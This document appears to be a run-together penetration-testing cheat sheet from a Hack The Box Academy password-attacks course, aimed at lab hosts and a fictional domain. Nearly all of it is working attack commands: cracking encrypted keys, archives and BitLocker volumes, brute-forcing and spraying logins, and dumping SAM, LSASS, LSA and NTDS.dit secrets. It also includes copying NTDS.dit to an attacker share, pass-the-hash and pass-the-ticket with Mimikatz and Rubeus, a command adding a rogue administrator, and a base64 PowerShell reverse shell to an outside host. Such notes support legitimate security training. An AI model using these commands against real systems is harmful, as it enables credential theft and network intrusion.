[A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null --> Looking for ssh keysssh-keygen -yf ~/.ssh/id_ed25519  --> Check if ssh key is encryptedEnter passphrase for "/home/jsmith/.ssh/id_rsa": --> If encrypted will ask for passwordzip2john ZIP.zip > zip.hash --> Converting Zip to johnfor i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done cracking OpenSSL encrypted GZIP files with password listbitlocker2john -i Backup.vhd > backup.hashes --> Bitlocker encrypted drives to johnhashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt --> Crack bbitlocker encrypted drives with john / hashcatsudo apt-get install dislocker --> Mounting bitlocker protected drivesudo mkdir -p /media/bitlockersudo mkdir -p /media/bitlockermountsudo losetup -f -P Backup.vhdsudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker --> Passwordsudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermountcd /media/bitlockermount/ls -lasudo umount /media/bitlockermountsudo umount /media/bitlockerhttps://github.com/Pennyw0rth/NetExec --> Netexec for bruteforce attacks on WinRmsudo apt-get -y install netexec --> Installing NetExecnetexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist> --> NetExec example usagenetexec winrm 10.129.42.197 -u user.list -p password.listsudo gem install evil-winrm --> Install Evil-WinRMevil-winrm -i <target-IP> -u <username> -p <password> --> Evil-WinRM usage, used for interaction with WinRMevil-winrm -i 10.129.42.197 -u user -p passwordhydra -L user.list -P password.list ssh://10.129.42.197 --> Use Hydra for ssh bruteforcinghydra -L user.list -P password.list rdp://10.129.42.197 --> Use Hydra for RDP bruteforcinghydra -L user.list -P password.list smb://10.129.42.197 --> Use Hydra for SMB bruteforcingmsf6 > use auxiliary/scanner/smb/smb_login --> Use metasploit module for SMB Bruteforcingnetexec smb 10.129.42.197 -u "user" -p "password" --shares --> netexec for SMB share accesssmbclient -U user \\\\10.129.42.197\\SHARENAME --> Smbclient to view share contentsnetexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!' --> Password spraying SMB, process of using the same password for multiple usershydra -C user_pass.list ssh://10.100.38.23 --> Credential stuffing SSH, process of usinng known stolen crednetials from one service to attempt to access accounts on a different servicepip3 install defaultcreds-cheat-sheetcreds search linksys --> Use creds to search for default credntials on products (linksys in this case)Windows Registry Hives:Registry Hive	DescriptionHKLM\SAM	Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.HKLM\SYSTEM	Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.HKLM\SECURITY	Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save --> Copying registry hivesThe operation completed successfully.C:\WINDOWS\system32> reg.exe save hklm\system C:\system.saveThe operation completed successfully.C:\WINDOWS\system32> reg.exe save hklm\security C:\security.saveThe operation completed successfully.python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL --> Dumping hashes with secretsdumpsudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt --> Cracking NT Hashes (-m 1000) with Hashcathashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt --> Cracking DCC2 Hashes (-m 2100) with Hashcatmimikatz.exe --> Can be used to decrypt DPAPI encrypted credentialsmimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exitnetexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa --> Dumping LSA secrets with netexecnetexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam --> Dumping SAM RemotelyDump LSASS process memory --> Open task manager, select the processes tab, find and right click the Local Security Authority Process, Select Create dump file, lsass.DMP will be saved in %temp%tasklist /svc --> Find lsass process id (PID) in CMDGet-Process lsass --> Find lsass process id (PID) in PowershellPS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_PID> C:\lsass.dmp full --> Dump file using powersgekkhttps://github.com/skelsec/pypykatz --> pypykatz linkpypykatz lsa minidump /home/peter/Documents/lsass.dmp --> Dump credentials using pypkatzC:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr --> Export windows vaultscmdkey /list --> Enumerate credentials with cmdkeyC:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd --> Impersonating userhttps://github.com/AlessandroZ/LaZagne https://github.com/ParrotSec/mimikatz --> Windows password extraction tools./username-anarchy -i /home/ltnbob/names.txt  --> Username Anarchy to convert a lsit of real names into common username formats https://github.com/urbanadventurer/username-anarchy./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt --> User Kerbtrue for brute-forcing, password spraying and username enumeration. (Username enumeration in this case) https://github.com/ropnop/kerbrutenetexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt --> Bruteforce attack with NetExecnet localgroup --> Check what privileges a local group has on windows / ADnet user bwilliamson --> Check what privileges a user has on windows / ADvssadmin CREATE SHADOW /For=C: --> Creating a shadow copy of C:cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit --> Copying NTDS.dit from the VSScmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData  --> Transferring NTDS.dit to attack hostimpacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL --> Extracting hashes from NTDS.ditnetexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil --> Faster method to capture NTDS.ditsudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --> Cracking a single NT hashevil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --> Authenticating with a hash /Pass The Hash (ptH)netexec smb 10.129.202.85 --> Can be used to get domain name of targetfindstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml --> look for passwords in specified file typesPasswd file format:Field	ValueUsername	htb-studentPassword	xUser ID	1000Group ID	1000GECOS	,,,Home directory	/home/htb-studentDefault shell	/bin/bashhead -n 1 /etc/passwd --> If passwd file is writable and password is present can remove root password entirleyShadow file format:Field	ValueUsername	htb-studentPassword	$y$j9T$3QSBB6CbHEu...SNIP...f8MsLast change	18955Min age	0Max age	99999Warning period	7Inactivity period	-Expiration date	-Reserved field	-Shadow Password Field Format:ID	Cryptographic Hash Algorithm1	MD52a	Blowfish5	SHA-2566	SHA-512sha1	SHA1crypty	Yescryptgy	Gost-yescrypt7	Scryptsudo cat /etc/security/opasswd --> Old passwords can be stored in Opasswdsudo cp /etc/passwd /tmp/passwd.bak sudo cp /etc/shadow /tmp/shadow.bak unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes --> Unshadow can be used to combine passwd and shadow files into a single file suitable for cracking https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.chashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked --> Use JtR or hashcat to crack these filesfor l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done --> Searching for configuration files in linuxfor i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done --> Search for user, password, pass in each file with the file extension .cnf.for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done --> Search for DB filesfind /home/* -type f -name "*.txt" -o ! -name "*.*" --> Searching for notes / text filesfor l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done --> Searching for scriptscat /etc/crontab  --> Enumerating cronjobsls -la /etc/cron.*/tail -n5 /home/*/.bash* --> Enumerating history files (Last 5 entries)Saltmer04@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done --> Enumerating log filessudo python3 mimipenguin.py --> Mimipenguin for credential hunting https://github.com/huntergregal/mimipenguinsudo python2.7 laZagne.py all --> Lazagne for credential hunting https://github.com/AlessandroZ/LaZagnels -l .mozilla/firefox/ | grep default  --> Browser credential huntingcat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .python3.9 firefox_decrypt.py --> Firefox decrypt for decrypting browser credentials https://github.com/unode/firefox_decrypt./Pcredz -f demo.pcapng -t -v --> Pcredz can be used to extract credentials from live traffic or through packet captures https://github.com/lgandx/PCredz (In this case against a packet capture file)Snaffler.exe -S --> Use snaffler to identify accessible network shares and search for interesting files https://github.com/SnaffCon/Snaffler-u --> retrieves a list of users from AD and searches for references to them in files-i -n --> allow you to specify which shares should be included in the searchPS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public --> PowerHuntShare can also be used for credential hunting, generates HTML output https://github.com/NetSPI/PowerHuntSharesdocker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025! --> MANSPIDER can be used from linx for credential hunting in network shares https://github.com/blacklanternsecurity/MANSPIDERnxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw" --> NetExec can similarily be usednxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator" --> Search for admin passwords within a specific share (HR in this case)mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit --> Oass the Hash from Windows Using Mimikatz/user - The user name we want to impersonate./rc4 or /NTLM - NTLM hash of the user's password./domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.)./run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).PS c:\htb> cd C:\tools\Invoke-TheHash\ --> Invoke-TheHash can also be used https://github.com/Kevin-Robertson/Invoke-TheHashPS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --> Can also PTH with a reverse shell, use https://www.revshells.com/ to create b64 powershell payload impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 --> Can PtH from linux with Impacket https://github.com/fortra/impacketnetexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --> And NetExec https://github.com/Pennyw0rth/NetExecnetexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoamievil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --> And Evil-Winrm https://github.com/Hackplayers/evil-winrmreg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f --> Enable Restricted Admin Mode to allow PtH for RdPxfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949Bmimikatz # sekurlsa::tickets /export --> Pass tje Toclet )PtT_ from windows using Mimikatzdir *.kirbiRubeus.exe dump /nowrap --> Us Rubeus to export raw tickets in base64 formatmimikatz.exe --> Mimikatz - Extract Kerberos keysmimikatz # privilege::debugmimikatz # sekurlsa::ekeysmimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f --> Then use found NT hash to PtTRubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap --> Forge a ticket with Rubeus (asktgt module with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des)More reading on Mimikatz sekurla::pth vs Rubeus asktgt PtH https://github.com/GhostPack/Rubeus#example-over-pass-the-hashUse AES hmac over NTLM in Kerberos exachange as NTLM might be detected as encryption downgradeRubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt --> Import ticket as base64Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi --> Can also import the raw ticket exported from mimikatz[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi")) --> Can convert ticket to b64c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...  --> Pass the ticket from b64 formatmimikatz.exe --> PtT in mimikatz mimikatz # privilege::debugmimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show --> Create Sacrificial process with Rubeus for PowerShell RemotingRubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt --> PtT for lateral movementpowershell --> After sucessful PtT remote connection to different hostEnter-PSSession -ComputerName DC01